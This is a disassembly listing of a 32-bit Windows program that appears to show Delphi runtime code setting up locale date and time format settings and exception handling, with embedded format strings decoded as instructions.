  40507c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40507f:	ba 03 00 00 00       	mov    $0x3,%edx
  405084:	83 f8 12             	cmp    $0x12,%eax
  405087:	76 05                	jbe    0x40508e
  405089:	b8 0f 00 00 00       	mov    $0xf,%eax
  40508e:	53                   	push   %ebx
  40508f:	50                   	push   %eax
  405090:	52                   	push   %edx
  405091:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405094:	89 f2                	mov    %esi,%edx
  405096:	0f b6 cf             	movzbl %bh,%ecx
  405099:	e8 f0 0b 00 00       	call   0x405c8e
  40509e:	89 c1                	mov    %eax,%ecx
  4050a0:	8d 75 b8             	lea    -0x48(%ebp),%esi
  4050a3:	c3                   	ret
  4050a4:	5f                   	pop    %edi
  4050a5:	5e                   	pop    %esi
  4050a6:	5b                   	pop    %ebx
  4050a7:	8b e5                	mov    %ebp,%esp
  4050a9:	5d                   	pop    %ebp
  4050aa:	c2 0c 00             	ret    $0xc
  4050ad:	8d 40 00             	lea    0x0(%eax),%eax
  4050b0:	55                   	push   %ebp
  4050b1:	8b ec                	mov    %esp,%ebp
  4050b3:	53                   	push   %ebx
  4050b4:	56                   	push   %esi
  4050b5:	57                   	push   %edi
  4050b6:	8b f9                	mov    %ecx,%edi
  4050b8:	8b f2                	mov    %edx,%esi
  4050ba:	8b d8                	mov    %eax,%ebx
  4050bc:	8b c6                	mov    %esi,%eax
  4050be:	e8 a1 fb ff ff       	call   0x404c64
  4050c3:	50                   	push   %eax
  4050c4:	57                   	push   %edi
  4050c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4050c8:	50                   	push   %eax
  4050c9:	8b ce                	mov    %esi,%ecx
  4050cb:	8b c3                	mov    %ebx,%eax
  4050cd:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
  4050d2:	e8 d1 fc ff ff       	call   0x404da8
  4050d7:	c6 04 03 00          	movb   $0x0,(%ebx,%eax,1)
  4050db:	8b c3                	mov    %ebx,%eax
  4050dd:	5f                   	pop    %edi
  4050de:	5e                   	pop    %esi
  4050df:	5b                   	pop    %ebx
  4050e0:	5d                   	pop    %ebp
  4050e1:	c2 04 00             	ret    $0x4
  4050e4:	55                   	push   %ebp
  4050e5:	8b ec                	mov    %esp,%ebp
  4050e7:	51                   	push   %ecx
  4050e8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4050eb:	91                   	xchg   %eax,%ecx
  4050ec:	87 d1                	xchg   %edx,%ecx
  4050ee:	e8 05 00 00 00       	call   0x4050f8
  4050f3:	5d                   	pop    %ebp
  4050f4:	c2 04 00             	ret    $0x4
  4050f7:	90                   	nop
  4050f8:	55                   	push   %ebp
  4050f9:	8b ec                	mov    %esp,%ebp
  4050fb:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  405101:	50                   	push   %eax
  405102:	83 c4 fc             	add    $0xfffffffc,%esp
  405105:	53                   	push   %ebx
  405106:	56                   	push   %esi
  405107:	57                   	push   %edi
  405108:	8b f9                	mov    %ecx,%edi
  40510a:	8b da                	mov    %edx,%ebx
  40510c:	8b f0                	mov    %eax,%esi
  40510e:	8b c3                	mov    %ebx,%eax
  405110:	e8 df e1 ff ff       	call   0x4032f4
  405115:	50                   	push   %eax
  405116:	57                   	push   %edi
  405117:	8b 45 08             	mov    0x8(%ebp),%eax
  40511a:	50                   	push   %eax
  40511b:	8b cb                	mov    %ebx,%ecx
  40511d:	8d 85 fe ef ff ff    	lea    -0x1002(%ebp),%eax
  405123:	ba 01 10 00 00       	mov    $0x1001,%edx
  405128:	e8 7b fc ff ff       	call   0x404da8
  40512d:	8b d8                	mov    %eax,%ebx
  40512f:	81 fb 01 10 00 00    	cmp    $0x1001,%ebx
  405135:	75 0a                	jne    0x405141
  405137:	b8 a7 ff 00 00       	mov    $0xffa7,%eax
  40513c:	e8 f3 f9 ff ff       	call   0x404b34
  405141:	8d 95 fe ef ff ff    	lea    -0x1002(%ebp),%edx
  405147:	8b c6                	mov    %esi,%eax
  405149:	8b cb                	mov    %ebx,%ecx
  40514b:	e8 28 e1 ff ff       	call   0x403278
  405150:	5f                   	pop    %edi
  405151:	5e                   	pop    %esi
  405152:	5b                   	pop    %ebx
  405153:	8b e5                	mov    %ebp,%esp
  405155:	5d                   	pop    %ebp
  405156:	c2 04 00             	ret    $0x4
  405159:	8d 40 00             	lea    0x0(%eax),%eax
  40515c:	55                   	push   %ebp
  40515d:	8b ec                	mov    %esp,%ebp
  40515f:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  405165:	53                   	push   %ebx
  405166:	56                   	push   %esi
  405167:	8b f1                	mov    %ecx,%esi
  405169:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40516c:	68 00 01 00 00       	push   $0x100
  405171:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  405177:	51                   	push   %ecx
  405178:	52                   	push   %edx
  405179:	50                   	push   %eax
  40517a:	e8 cd f2 ff ff       	call   0x40444c
  40517f:	85 c0                	test   %eax,%eax
  405181:	7e 12                	jle    0x405195
  405183:	8b c8                	mov    %eax,%ecx
  405185:	49                   	dec    %ecx
  405186:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  40518c:	8b c3                	mov    %ebx,%eax
  40518e:	e8 e5 e0 ff ff       	call   0x403278
  405193:	eb 09                	jmp    0x40519e
  405195:	8b c3                	mov    %ebx,%eax
  405197:	8b d6                	mov    %esi,%edx
  405199:	e8 8e e0 ff ff       	call   0x40322c
  40519e:	5e                   	pop    %esi
  40519f:	5b                   	pop    %ebx
  4051a0:	8b e5                	mov    %ebp,%esp
  4051a2:	5d                   	pop    %ebp
  4051a3:	c2 04 00             	ret    $0x4
  4051a6:	8b c0                	mov    %eax,%eax
  4051a8:	53                   	push   %ebx
  4051a9:	56                   	push   %esi
  4051aa:	57                   	push   %edi
  4051ab:	51                   	push   %ecx
  4051ac:	8b d9                	mov    %ecx,%ebx
  4051ae:	8b f2                	mov    %edx,%esi
  4051b0:	8b f8                	mov    %eax,%edi
  4051b2:	6a 02                	push   $0x2
  4051b4:	8d 44 24 04          	lea    0x4(%esp),%eax
  4051b8:	50                   	push   %eax
  4051b9:	56                   	push   %esi
  4051ba:	57                   	push   %edi
  4051bb:	e8 8c f2 ff ff       	call   0x40444c
  4051c0:	85 c0                	test   %eax,%eax
  4051c2:	7e 05                	jle    0x4051c9
  4051c4:	8a 04 24             	mov    (%esp),%al
  4051c7:	eb 02                	jmp    0x4051cb
  4051c9:	8b c3                	mov    %ebx,%eax
  4051cb:	5a                   	pop    %edx
  4051cc:	5f                   	pop    %edi
  4051cd:	5e                   	pop    %esi
  4051ce:	5b                   	pop    %ebx
  4051cf:	c3                   	ret
  4051d0:	55                   	push   %ebp
  4051d1:	8b ec                	mov    %esp,%ebp
  4051d3:	83 c4 f0             	add    $0xfffffff0,%esp
  4051d6:	53                   	push   %ebx
  4051d7:	56                   	push   %esi
  4051d8:	57                   	push   %edi
  4051d9:	33 c0                	xor    %eax,%eax
  4051db:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4051de:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4051e1:	33 c0                	xor    %eax,%eax
  4051e3:	55                   	push   %ebp
  4051e4:	68 06 53 40 00       	push   $0x405306
  4051e9:	64 ff 30             	push   %fs:(%eax)
  4051ec:	64 89 20             	mov    %esp,%fs:(%eax)
  4051ef:	e8 78 f2 ff ff       	call   0x40446c
  4051f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4051f7:	bb 01 00 00 00       	mov    $0x1,%ebx
  4051fc:	be bc b4 40 00       	mov    $0x40b4bc,%esi
  405201:	bf ec b4 40 00       	mov    $0x40b4ec,%edi
  405206:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405209:	50                   	push   %eax
  40520a:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40520d:	8d 83 bf ff 00 00    	lea    0xffbf(%ebx),%eax
  405213:	e8 14 fa ff ff       	call   0x404c2c
  405218:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40521b:	8d 53 44             	lea    0x44(%ebx),%edx
  40521e:	4a                   	dec    %edx
  40521f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405222:	e8 35 ff ff ff       	call   0x40515c
  405227:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40522a:	8b c6                	mov    %esi,%eax
  40522c:	e8 b7 df ff ff       	call   0x4031e8
  405231:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405234:	50                   	push   %eax
  405235:	8d 55 f0             	lea    -0x10(%ebp),%edx
  405238:	8d 83 cf ff 00 00    	lea    0xffcf(%ebx),%eax
  40523e:	e8 e9 f9 ff ff       	call   0x404c2c
  405243:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405246:	8d 53 38             	lea    0x38(%ebx),%edx
  405249:	4a                   	dec    %edx
  40524a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40524d:	e8 0a ff ff ff       	call   0x40515c
  405252:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405255:	8b c7                	mov    %edi,%eax
  405257:	e8 8c df ff ff       	call   0x4031e8
  40525c:	43                   	inc    %ebx
  40525d:	83 c7 04             	add    $0x4,%edi
  405260:	83 c6 04             	add    $0x4,%esi
  405263:	83 fb 0d             	cmp    $0xd,%ebx
  405266:	75 9e                	jne    0x405206
  405268:	bb 01 00 00 00       	mov    $0x1,%ebx
  40526d:	be 1c b5 40 00       	mov    $0x40b51c,%esi
  405272:	bf 38 b5 40 00       	mov    $0x40b538,%edi
  405277:	8d 43 05             	lea    0x5(%ebx),%eax
  40527a:	b9 07 00 00 00       	mov    $0x7,%ecx
  40527f:	99                   	cltd
  405280:	f7 f9                	idiv   %ecx
  405282:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405285:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405288:	50                   	push   %eax
  405289:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40528c:	8d 83 df ff 00 00    	lea    0xffdf(%ebx),%eax
  405292:	e8 95 f9 ff ff       	call   0x404c2c
  405297:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40529a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40529d:	83 c2 31             	add    $0x31,%edx
  4052a0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4052a3:	e8 b4 fe ff ff       	call   0x40515c
  4052a8:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4052ab:	8b c6                	mov    %esi,%eax
  4052ad:	e8 36 df ff ff       	call   0x4031e8
  4052b2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4052b5:	50                   	push   %eax
  4052b6:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4052b9:	8d 83 e6 ff 00 00    	lea    0xffe6(%ebx),%eax
  4052bf:	e8 68 f9 ff ff       	call   0x404c2c
  4052c4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4052c7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4052ca:	83 c2 2a             	add    $0x2a,%edx
  4052cd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4052d0:	e8 87 fe ff ff       	call   0x40515c
  4052d5:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4052d8:	8b c7                	mov    %edi,%eax
  4052da:	e8 09 df ff ff       	call   0x4031e8
  4052df:	43                   	inc    %ebx
  4052e0:	83 c7 04             	add    $0x4,%edi
  4052e3:	83 c6 04             	add    $0x4,%esi
  4052e6:	83 fb 08             	cmp    $0x8,%ebx
  4052e9:	75 8c                	jne    0x405277
  4052eb:	33 c0                	xor    %eax,%eax
  4052ed:	5a                   	pop    %edx
  4052ee:	59                   	pop    %ecx
  4052ef:	59                   	pop    %ecx
  4052f0:	64 89 10             	mov    %edx,%fs:(%eax)
  4052f3:	68 0d 53 40 00       	push   $0x40530d
  4052f8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4052fb:	ba 02 00 00 00       	mov    $0x2,%edx
  405300:	e8 b3 de ff ff       	call   0x4031b8
  405305:	c3                   	ret
  405306:	e9 f1 da ff ff       	jmp    0x402dfc
  40530b:	eb eb                	jmp    0x4052f8
  40530d:	5f                   	pop    %edi
  40530e:	5e                   	pop    %esi
  40530f:	5b                   	pop    %ebx
  405310:	8b e5                	mov    %ebp,%esp
  405312:	5d                   	pop    %ebp
  405313:	c3                   	ret
  405314:	55                   	push   %ebp
  405315:	8b ec                	mov    %esp,%ebp
  405317:	6a 00                	push   $0x0
  405319:	6a 00                	push   $0x0
  40531b:	6a 00                	push   $0x0
  40531d:	53                   	push   %ebx
  40531e:	56                   	push   %esi
  40531f:	57                   	push   %edi
  405320:	33 c0                	xor    %eax,%eax
  405322:	55                   	push   %ebp
  405323:	68 5c 55 40 00       	push   $0x40555c
  405328:	64 ff 30             	push   %fs:(%eax)
  40532b:	64 89 20             	mov    %esp,%fs:(%eax)
  40532e:	e8 39 f1 ff ff       	call   0x40446c
  405333:	8b d8                	mov    %eax,%ebx
  405335:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405338:	50                   	push   %eax
  405339:	33 c9                	xor    %ecx,%ecx
  40533b:	ba 14 00 00 00       	mov    $0x14,%edx
  405340:	8b c3                	mov    %ebx,%eax
  405342:	e8 15 fe ff ff       	call   0x40515c
  405347:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40534a:	b8 94 b4 40 00       	mov    $0x40b494,%eax
  40534f:	e8 94 de ff ff       	call   0x4031e8
  405354:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405357:	50                   	push   %eax
  405358:	b9 74 55 40 00       	mov    $0x405574,%ecx
  40535d:	ba 1b 00 00 00       	mov    $0x1b,%edx
  405362:	8b c3                	mov    %ebx,%eax
  405364:	e8 f3 fd ff ff       	call   0x40515c
  405369:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40536c:	33 d2                	xor    %edx,%edx
  40536e:	e8 a1 f8 ff ff       	call   0x404c14
  405373:	a2 98 b4 40 00       	mov    %al,0x40b498
  405378:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40537b:	50                   	push   %eax
  40537c:	b9 74 55 40 00       	mov    $0x405574,%ecx
  405381:	ba 1c 00 00 00       	mov    $0x1c,%edx
  405386:	8b c3                	mov    %ebx,%eax
  405388:	e8 cf fd ff ff       	call   0x40515c
  40538d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405390:	33 d2                	xor    %edx,%edx
  405392:	e8 7d f8 ff ff       	call   0x404c14
  405397:	a2 99 b4 40 00       	mov    %al,0x40b499
  40539c:	b1 2c                	mov    $0x2c,%cl
  40539e:	ba 0f 00 00 00       	mov    $0xf,%edx
  4053a3:	8b c3                	mov    %ebx,%eax
  4053a5:	e8 fe fd ff ff       	call   0x4051a8
  4053aa:	a2 9a b4 40 00       	mov    %al,0x40b49a
  4053af:	b1 2e                	mov    $0x2e,%cl
  4053b1:	ba 0e 00 00 00       	mov    $0xe,%edx
  4053b6:	8b c3                	mov    %ebx,%eax
  4053b8:	e8 eb fd ff ff       	call   0x4051a8
  4053bd:	a2 9b b4 40 00       	mov    %al,0x40b49b
  4053c2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4053c5:	50                   	push   %eax
  4053c6:	b9 74 55 40 00       	mov    $0x405574,%ecx
  4053cb:	ba 19 00 00 00       	mov    $0x19,%edx
  4053d0:	8b c3                	mov    %ebx,%eax
  4053d2:	e8 85 fd ff ff       	call   0x40515c
  4053d7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4053da:	33 d2                	xor    %edx,%edx
  4053dc:	e8 33 f8 ff ff       	call   0x404c14
  4053e1:	a2 9c b4 40 00       	mov    %al,0x40b49c
  4053e6:	b1 2f                	mov    $0x2f,%cl
  4053e8:	ba 1d 00 00 00       	mov    $0x1d,%edx
  4053ed:	8b c3                	mov    %ebx,%eax
  4053ef:	e8 b4 fd ff ff       	call   0x4051a8
  4053f4:	a2 9d b4 40 00       	mov    %al,0x40b49d
  4053f9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4053fc:	50                   	push   %eax
  4053fd:	b9 80 55 40 00       	mov    $0x405580,%ecx
  405402:	ba 1f 00 00 00       	mov    $0x1f,%edx
  405407:	8b c3                	mov    %ebx,%eax
  405409:	e8 4e fd ff ff       	call   0x40515c
  40540e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405411:	b8 a0 b4 40 00       	mov    $0x40b4a0,%eax
  405416:	e8 cd dd ff ff       	call   0x4031e8
  40541b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40541e:	50                   	push   %eax
  40541f:	b9 90 55 40 00       	mov    $0x405590,%ecx
  405424:	ba 20 00 00 00       	mov    $0x20,%edx
  405429:	8b c3                	mov    %ebx,%eax
  40542b:	e8 2c fd ff ff       	call   0x40515c
  405430:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405433:	b8 a4 b4 40 00       	mov    $0x40b4a4,%eax
  405438:	e8 ab dd ff ff       	call   0x4031e8
  40543d:	b1 3a                	mov    $0x3a,%cl
  40543f:	ba 1e 00 00 00       	mov    $0x1e,%edx
  405444:	8b c3                	mov    %ebx,%eax
  405446:	e8 5d fd ff ff       	call   0x4051a8
  40544b:	a2 a8 b4 40 00       	mov    %al,0x40b4a8
  405450:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405453:	50                   	push   %eax
  405454:	b9 a8 55 40 00       	mov    $0x4055a8,%ecx
  405459:	ba 28 00 00 00       	mov    $0x28,%edx
  40545e:	8b c3                	mov    %ebx,%eax
  405460:	e8 f7 fc ff ff       	call   0x40515c
  405465:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405468:	b8 ac b4 40 00       	mov    $0x40b4ac,%eax
  40546d:	e8 76 dd ff ff       	call   0x4031e8
  405472:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405475:	50                   	push   %eax
  405476:	b9 b4 55 40 00       	mov    $0x4055b4,%ecx
  40547b:	ba 29 00 00 00       	mov    $0x29,%edx
  405480:	8b c3                	mov    %ebx,%eax
  405482:	e8 d5 fc ff ff       	call   0x40515c
  405487:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40548a:	b8 b0 b4 40 00       	mov    $0x40b4b0,%eax
  40548f:	e8 54 dd ff ff       	call   0x4031e8
  405494:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405497:	50                   	push   %eax
  405498:	b9 74 55 40 00       	mov    $0x405574,%ecx
  40549d:	ba 25 00 00 00       	mov    $0x25,%edx
  4054a2:	8b c3                	mov    %ebx,%eax
  4054a4:	e8 b3 fc ff ff       	call   0x40515c
  4054a9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4054ac:	33 d2                	xor    %edx,%edx
  4054ae:	e8 61 f7 ff ff       	call   0x404c14
  4054b3:	85 c0                	test   %eax,%eax
  4054b5:	75 0f                	jne    0x4054c6
  4054b7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4054ba:	ba c0 55 40 00       	mov    $0x4055c0,%edx
  4054bf:	e8 68 dd ff ff       	call   0x40322c
  4054c4:	eb 0d                	jmp    0x4054d3
  4054c6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4054c9:	ba cc 55 40 00       	mov    $0x4055cc,%edx
  4054ce:	e8 59 dd ff ff       	call   0x40322c
  4054d3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054d6:	50                   	push   %eax
  4054d7:	b9 74 55 40 00       	mov    $0x405574,%ecx
  4054dc:	ba 23 00 00 00       	mov    $0x23,%edx
  4054e1:	8b c3                	mov    %ebx,%eax
  4054e3:	e8 74 fc ff ff       	call   0x40515c
  4054e8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4054eb:	33 d2                	xor    %edx,%edx
  4054ed:	e8 22 f7 ff ff       	call   0x404c14
  4054f2:	85 c0                	test   %eax,%eax
  4054f4:	75 0f                	jne    0x405505
  4054f6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4054f9:	ba d8 55 40 00       	mov    $0x4055d8,%edx
  4054fe:	e8 29 dd ff ff       	call   0x40322c
  405503:	eb 08                	jmp    0x40550d
  405505:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405508:	e8 8b dc ff ff       	call   0x403198
  40550d:	ff 75 fc             	push   -0x4(%ebp)
  405510:	68 e8 55 40 00       	push   $0x4055e8
  405515:	ff 75 f8             	push   -0x8(%ebp)
  405518:	b8 b4 b4 40 00       	mov    $0x40b4b4,%eax
  40551d:	ba 03 00 00 00       	mov    $0x3,%edx
  405522:	e8 8d de ff ff       	call   0x4033b4
  405527:	ff 75 fc             	push   -0x4(%ebp)
  40552a:	68 f4 55 40 00       	push   $0x4055f4
  40552f:	ff 75 f8             	push   -0x8(%ebp)
  405532:	b8 b8 b4 40 00       	mov    $0x40b4b8,%eax
  405537:	ba 03 00 00 00       	mov    $0x3,%edx
  40553c:	e8 73 de ff ff       	call   0x4033b4
  405541:	33 c0                	xor    %eax,%eax
  405543:	5a                   	pop    %edx
  405544:	59                   	pop    %ecx
  405545:	59                   	pop    %ecx
  405546:	64 89 10             	mov    %edx,%fs:(%eax)
  405549:	68 63 55 40 00       	push   $0x405563
  40554e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405551:	ba 03 00 00 00       	mov    $0x3,%edx
  405556:	e8 5d dc ff ff       	call   0x4031b8
  40555b:	c3                   	ret
  40555c:	e9 9b d8 ff ff       	jmp    0x402dfc
  405561:	eb eb                	jmp    0x40554e
  405563:	5f                   	pop    %edi
  405564:	5e                   	pop    %esi
  405565:	5b                   	pop    %ebx
  405566:	8b e5                	mov    %ebp,%esp
  405568:	5d                   	pop    %ebp
  405569:	c3                   	ret
  40556a:	00 00                	add    %al,(%eax)
  40556c:	ff                   	(bad)
  40556d:	ff                   	(bad)
  40556e:	ff                   	(bad)
  40556f:	ff 01                	incl   (%ecx)
  405571:	00 00                	add    %al,(%eax)
  405573:	00 30                	add    %dh,(%eax)
  405575:	00 00                	add    %al,(%eax)
  405577:	00 ff                	add    %bh,%bh
  405579:	ff                   	(bad)
  40557a:	ff                   	(bad)
  40557b:	ff 06                	incl   (%esi)
  40557d:	00 00                	add    %al,(%eax)
  40557f:	00 6d 2f             	add    %ch,0x2f(%ebp)
  405582:	64 2f                	fs das
  405584:	79 79                	jns    0x4055ff
  405586:	00 00                	add    %al,(%eax)
  405588:	ff                   	(bad)
  405589:	ff                   	(bad)
  40558a:	ff                   	(bad)
  40558b:	ff 0c 00             	decl   (%eax,%eax,1)
  40558e:	00 00                	add    %al,(%eax)
  405590:	6d                   	insl   (%dx),%es:(%edi)
  405591:	6d                   	insl   (%dx),%es:(%edi)
  405592:	6d                   	insl   (%dx),%es:(%edi)
  405593:	6d                   	insl   (%dx),%es:(%edi)
  405594:	20 64 2c 20          	and    %ah,0x20(%esp,%ebp,1)
  405598:	79 79                	jns    0x405613
  40559a:	79 79                	jns    0x405615
  40559c:	00 00                	add    %al,(%eax)
  40559e:	00 00                	add    %al,(%eax)
  4055a0:	ff                   	(bad)
  4055a1:	ff                   	(bad)
  4055a2:	ff                   	(bad)
  4055a3:	ff 02                	incl   (%edx)
  4055a5:	00 00                	add    %al,(%eax)
  4055a7:	00 61 6d             	add    %ah,0x6d(%ecx)
  4055aa:	00 00                	add    %al,(%eax)
  4055ac:	ff                   	(bad)
  4055ad:	ff                   	(bad)
  4055ae:	ff                   	(bad)
  4055af:	ff 02                	incl   (%edx)
  4055b1:	00 00                	add    %al,(%eax)
  4055b3:	00 70 6d             	add    %dh,0x6d(%eax)
  4055b6:	00 00                	add    %al,(%eax)
  4055b8:	ff                   	(bad)
  4055b9:	ff                   	(bad)
  4055ba:	ff                   	(bad)
  4055bb:	ff 01                	incl   (%ecx)
  4055bd:	00 00                	add    %al,(%eax)
  4055bf:	00 68 00             	add    %ch,0x0(%eax)
  4055c2:	00 00                	add    %al,(%eax)
  4055c4:	ff                   	(bad)
  4055c5:	ff                   	(bad)
  4055c6:	ff                   	(bad)
  4055c7:	ff 02                	incl   (%edx)
  4055c9:	00 00                	add    %al,(%eax)
  4055cb:	00 68 68             	add    %ch,0x68(%eax)
  4055ce:	00 00                	add    %al,(%eax)
  4055d0:	ff                   	(bad)
  4055d1:	ff                   	(bad)
  4055d2:	ff                   	(bad)
  4055d3:	ff 05 00 00 00 20    	incl   0x20000000
  4055d9:	41                   	inc    %ecx
  4055da:	4d                   	dec    %ebp
  4055db:	50                   	push   %eax
  4055dc:	4d                   	dec    %ebp
  4055dd:	00 00                	add    %al,(%eax)
  4055df:	00 ff                	add    %bh,%bh
  4055e1:	ff                   	(bad)
  4055e2:	ff                   	(bad)
  4055e3:	ff 03                	incl   (%ebx)
  4055e5:	00 00                	add    %al,(%eax)
  4055e7:	00 3a                	add    %bh,(%edx)
  4055e9:	6d                   	insl   (%dx),%es:(%edi)
  4055ea:	6d                   	insl   (%dx),%es:(%edi)
  4055eb:	00 ff                	add    %bh,%bh
  4055ed:	ff                   	(bad)
  4055ee:	ff                   	(bad)
  4055ef:	ff 06                	incl   (%esi)
  4055f1:	00 00                	add    %al,(%eax)
  4055f3:	00 3a                	add    %bh,(%edx)
  4055f5:	6d                   	insl   (%dx),%es:(%edi)
  4055f6:	6d                   	insl   (%dx),%es:(%edi)
  4055f7:	3a 73 73             	cmp    0x73(%ebx),%dh
  4055fa:	00 00                	add    %al,(%eax)
  4055fc:	e8 53 db ff ff       	call   0x403154
  405601:	83 b8 00 00 00 00 00 	cmpl   $0x0,0x0(%eax)
  405608:	74 0f                	je     0x405619
  40560a:	e8 45 db ff ff       	call   0x403154
  40560f:	8b 80 00 00 00 00    	mov    0x0(%eax),%eax
  405615:	8b 40 08             	mov    0x8(%eax),%eax
  405618:	c3                   	ret
  405619:	33 c0                	xor    %eax,%eax
  40561b:	c3                   	ret
  40561c:	85 c0                	test   %eax,%eax
  40561e:	74 05                	je     0x405625
  405620:	2d 78 11 40 00       	sub    $0x401178,%eax
  405625:	c3                   	ret
  405626:	8b c0                	mov    %eax,%eax
  405628:	53                   	push   %ebx
  405629:	56                   	push   %esi
  40562a:	57                   	push   %edi
  40562b:	55                   	push   %ebp
  40562c:	81 c4 58 fd ff ff    	add    $0xfffffd58,%esp
  405632:	8b ea                	mov    %edx,%ebp
  405634:	8b f0                	mov    %eax,%esi
  405636:	68 00 01 00 00       	push   $0x100
  40563b:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  405642:	50                   	push   %eax
  405643:	a1 14 b0 40 00       	mov    0x40b014,%eax
  405648:	50                   	push   %eax
  405649:	e8 06 ee ff ff       	call   0x404454
  40564e:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  405655:	b2 5c                	mov    $0x5c,%dl
  405657:	e8 b0 f6 ff ff       	call   0x404d0c
  40565c:	8b d0                	mov    %eax,%edx
  40565e:	42                   	inc    %edx
  40565f:	8b c4                	mov    %esp,%eax
  405661:	b9 3f 00 00 00       	mov    $0x3f,%ecx
  405666:	e8 4d f6 ff ff       	call   0x404cb8
  40566b:	bb a4 57 40 00       	mov    $0x4057a4,%ebx
  405670:	bf a4 57 40 00       	mov    $0x4057a4,%edi
  405675:	8b c6                	mov    %esi,%eax
  405677:	ba b0 45 40 00       	mov    $0x4045b0,%edx
  40567c:	e8 eb d2 ff ff       	call   0x40296c
  405681:	84 c0                	test   %al,%al
  405683:	74 21                	je     0x4056a6
  405685:	8b 46 04             	mov    0x4(%esi),%eax
  405688:	e8 87 dd ff ff       	call   0x403414
  40568d:	8b d8                	mov    %eax,%ebx
  40568f:	8b c3                	mov    %ebx,%eax
  405691:	e8 ce f5 ff ff       	call   0x404c64
  405696:	85 c0                	test   %eax,%eax
  405698:	74 0c                	je     0x4056a6
  40569a:	80 7c 03 ff 2e       	cmpb   $0x2e,-0x1(%ebx,%eax,1)
  40569f:	74 05                	je     0x4056a6
  4056a1:	bf a8 57 40 00       	mov    $0x4057a8,%edi
  4056a6:	6a 40                	push   $0x40
  4056a8:	8d 44 24 44          	lea    0x44(%esp),%eax
  4056ac:	50                   	push   %eax
  4056ad:	68 9e ff 00 00       	push   $0xff9e
  4056b2:	a1 14 b0 40 00       	mov    0x40b014,%eax
  4056b7:	50                   	push   %eax
  4056b8:	e8 8f ee ff ff       	call   0x40454c
  4056bd:	6a 04                	push   $0x4
  4056bf:	8d 94 24 ac 01 00 00 	lea    0x1ac(%esp),%edx
  4056c6:	8b 06                	mov    (%esi),%eax
  4056c8:	e8 9f d1 ff ff       	call   0x40286c
  4056cd:	8d 84 24 ac 01 00 00 	lea    0x1ac(%esp),%eax
  4056d4:	89 84 24 84 01 00 00 	mov    %eax,0x184(%esp)
  4056db:	c6 84 24 88 01 00 00 	movb   $0x4,0x188(%esp)
  4056e2:	04 
  4056e3:	8d 44 24 04          	lea    0x4(%esp),%eax
  4056e7:	89 84 24 8c 01 00 00 	mov    %eax,0x18c(%esp)
  4056ee:	c6 84 24 90 01 00 00 	movb   $0x6,0x190(%esp)
  4056f5:	06 
  4056f6:	8b c5                	mov    %ebp,%eax
  4056f8:	e8 1f ff ff ff       	call   0x40561c
  4056fd:	89 84 24 94 01 00 00 	mov    %eax,0x194(%esp)
  405704:	c6 84 24 98 01 00 00 	movb   $0x5,0x198(%esp)
  40570b:	05 
  40570c:	89 9c 24 9c 01 00 00 	mov    %ebx,0x19c(%esp)
  405713:	c6 84 24 a0 01 00 00 	movb   $0x6,0x1a0(%esp)
  40571a:	06 
  40571b:	89 bc 24 a4 01 00 00 	mov    %edi,0x1a4(%esp)
  405722:	c6 84 24 a8 01 00 00 	movb   $0x6,0x1a8(%esp)
  405729:	06 
  40572a:	8d 8c 24 84 01 00 00 	lea    0x184(%esp),%ecx
